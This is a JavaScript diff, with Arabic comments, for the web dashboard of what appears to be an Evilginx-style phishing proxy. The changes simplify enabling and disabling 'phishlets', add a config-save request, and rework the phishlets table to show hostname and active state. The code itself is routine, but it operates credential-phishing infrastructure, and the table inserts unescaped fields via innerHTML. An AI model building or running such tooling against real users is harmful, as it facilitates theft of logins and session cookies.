@@ -237,113 +237,59 @@ async function fetchSessions() {
 // تفعيل أو تعطيل الـ Phishlet
 async function togglePhishlet(name, enable) {
     try {
-        // إذا كنا نحاول تفعيل الـ phishlet، نتحقق أولًا مما إذا كان له hostname مضبوط
-        if (enable) {
-            // الحصول على معلومات الـ phishlet
-            const phishletResponse = await fetch(`${API_BASE_URL}/phishlets/${name}`, {
-                method: 'GET',
-                headers: getHeaders()
-            });
-            
-            if (!phishletResponse.ok) {
-                throw {
-                    status: phishletResponse.status,
-                    message: `فشل في الحصول على معلومات الـ Phishlet`
-                };
-            }
-            
-            const phishletData = await phishletResponse.json();
-            console.log('بيانات الـ Phishlet:', phishletData);
-            
-            // إذا لم يكن للـ phishlet hostname، نسأل المستخدم عن إدخاله
-            if (!phishletData.data.hostname || phishletData.data.hostname === "") {
-                // عرض مودال لإدخال hostname
-                return new Promise((resolve) => {
-                    showHostnameModal(name, async (hostname) => {
-                        if (hostname) {
-                            // تحديث hostname للـ phishlet
-                            const updateResponse = await fetch(`${API_BASE_URL}/configs/hostname`, {
-                                method: 'POST',
-                                headers: getHeaders(),
-                                body: JSON.stringify({
-                                    phishlet: name,
-                                    hostname: hostname
-                                })
-                            });
-                            
-                            if (!updateResponse.ok) {
-                                showToast('خطأ', 'فشل في تحديث hostname للـ phishlet', 'error');
-                                resolve(false);
-                                return;
-                            }
-                            
-                            // الآن نحاول تفعيل الـ phishlet
-                            const success = await enablePhishlet(name);
-                            resolve(success);
-                        } else {
-                            // المستخدم ألغى العملية
-                            resolve(false);
-                        }
-                    });
-                });
-            }
-        }
+        console.log(`محاولة ${enable ? 'تفعيل' : 'تعطيل'} الـ Phishlet: ${name}`);
         
-        // إذا وصلنا إلى هنا، فإما أننا نعطل الـ phishlet أو أن الـ phishlet له hostname بالفعل
         const action = enable ? 'enable' : 'disable';
         const response = await fetch(`${API_BASE_URL}/phishlets/${name}/${action}`, {
             method: 'POST',
             headers: getHeaders()
         });
         
-        console.log(`استجابة ${enable ? 'تفعيل' : 'تعطيل'} الـ Phishlet:`, response);
+        // تسجيل الاستجابة كاملة للتصحيح
+        console.log(`استجابة ${action} للـ phishlet:`, response);
         
-        if (!response.ok) {
-            // الحصول على تفاصيل الخطأ
-            const errorData = await response.json();
-            console.error('بيانات الخطأ:', errorData);
+        const data = await response.json();
+        console.log(`بيانات استجابة ${action} للـ phishlet:`, data);
+        
+        if (data.success) {
+            showToast('تم بنجاح', `تم ${enable ? 'تفعيل' : 'تعطيل'} الـ Phishlet ${name} بنجاح`, 'success');
             
-            throw {
-                status: response.status,
-                message: errorData.message || `فشل في ${enable ? 'تفعيل' : 'تعطيل'} الـ Phishlet`
-            };
+            // التحقق مما إذا كانت الملفات قد تم حفظها
+            await checkConfigSaved();
+            
+            return true;
+        } else {
+            showToast('خطأ', `فشل في ${enable ? 'تفعيل' : 'تعطيل'} الـ Phishlet: ${data.message || 'خطأ غير معروف'}`, 'error');
+            return false;
         }
-        
-        showToast('تم بنجاح', `تم ${enable ? 'تفعيل' : 'تعطيل'} الـ Phishlet ${name} بنجاح`, 'success');
-        return true;
     } catch (error) {
-        console.error(`خطأ أثناء ${enable ? 'تفعيل' : 'تعطيل'} الـ Phishlet:`, error);
-        handleApiError(error);
+        console.error(`خطأ في ${enable ? 'تفعيل' : 'تعطيل'} الـ Phishlet:`, error);
+        showToast('خطأ', `حدث خطأ: ${error.message}`, 'error');
         return false;
     }
 }
 
-// وظيفة مساعدة لتفعيل الـ phishlet
-async function enablePhishlet(name) {
+// التحقق مما إذا كانت التغييرات قد تم حفظها
+async function checkConfigSaved() {
     try {
-        const response = await fetch(`${API_BASE_URL}/phishlets/${name}/enable`, {
+        // طلب لحفظ التكوين
+        const response = await fetch('/api/config/save', {
             method: 'POST',
             headers: getHeaders()
         });
         
-        console.log(`استجابة تفعيل الـ Phishlet:`, response);
+        const data = await response.json();
+        console.log('استجابة حفظ التكوين:', data);
         
-        if (!response.ok) {
-            // الحصول على تفاصيل الخطأ
-            const errorData = await response.json();
-            console.error('بيانات الخطأ:', errorData);
-            
-            throw {
-                status: response.status,
-                message: errorData.message || `فشل في تفعيل الـ Phishlet`
-            };
+        if (data.success) {
+            console.log('تم حفظ التكوين بنجاح');
+            return true;
+        } else {
+            console.warn('فشل حفظ التكوين:', data.message);
+            return false;
         }
-        
-        showToast('تم بنجاح', `تم تفعيل الـ Phishlet ${name} بنجاح`, 'success');
-        return true;
     } catch (error) {
-        console.error(`خطأ أثناء تفعيل الـ Phishlet:`, error);
-        handleApiError(error);
+        console.error('خطأ في حفظ التكوين:', error);
         return false;
     }
 }
@@ -608,18 +554,22 @@ function populatePhishletsTable(phishlets) {
         return;
     }
     
+    console.log('بيانات الـ Phishlets المستلمة:', phishlets);
+    
     phishlets.forEach(phishlet => {
         const tr = document.createElement('tr');
         // تأكد من أن جميع الخصائص المطلوبة موجودة
         const name = phishlet.name || phishlet.id || '';
         const author = phishlet.author || '';
-        const domains = phishlet.domains || phishlet.proxyHosts || [];
-        const enabled = phishlet.enabled === true;
+        const hostname = phishlet.hostname || '';
+        
+        // التحقق من حالة التفعيل - يمكن أن تكون في أي من هذه الحقول
+        const enabled = phishlet.is_active === true || phishlet.isActive === true || phishlet.IsActive === true || phishlet.enabled === true;
         
         tr.innerHTML = `
             <td>${name}</td>
             <td>${author}</td>
-            <td>${Array.isArray(domains) ? domains.join(', ') : domains}</td>
+            <td>${hostname || 'غير محدد'}</td>
             <td><span class="badge ${enabled ? 'badge-success' : 'badge-danger'}">${enabled ? 'مفعل' : 'معطل'}</span></td>
             <td class="action-buttons">
                 <button class="btn btn-sm ${enabled ? 'btn-danger' : 'btn-success'}" data-action="${enabled ? 'disable' : 'enable'}" data-name="${name}">
